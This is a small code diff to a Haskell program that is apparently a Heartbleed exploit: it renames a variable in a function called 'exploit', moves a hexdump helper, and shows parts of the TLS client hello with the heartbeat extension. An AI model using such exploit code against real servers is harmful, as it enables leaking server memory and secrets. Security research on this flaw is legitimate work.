@@ -103,13 +103,16 @@ exploit f c (s, _) = do putStrLn "Sending client hello..."
         -- Receive as much data as the server has to offer and discard it.
         -- If nothing is received the server has prematurely closed the connection
         ignoreHello :: IO (Maybe String)
-        ignoreHello = do pay <- recv s 1024
-                         case pay of
+        ignoreHello = do response <- recv s 1024
+                         case response of
                            Just payload -> if BS.length payload < 1024
                                               then ignoreHello
                                               else return Nothing
                            Nothing -> return (Just "Connection closed before receiving a server hello")
 
+-- Pretty print hex representation of binary data.
+hexdump :: ByteString -> IO ()
+hexdump = putStrLn . prettyHex
 
 -- Create the heartbeat request for a given TLS version (0x01 to 0x03)
 heartBeat :: Char -> ByteString
@@ -170,7 +173,3 @@ clientHello tlsVer = BS.pack cls
               ,'\x00', '\x23', '\x00', '\x00'
                -- Extension: Heartbeat
               ,'\x00', '\x0f', '\x00', '\x01', '\x01']
-
--- Pretty print hex representation of binary data.
-hexdump :: ByteString -> IO ()
-hexdump = putStrLn . prettyHex
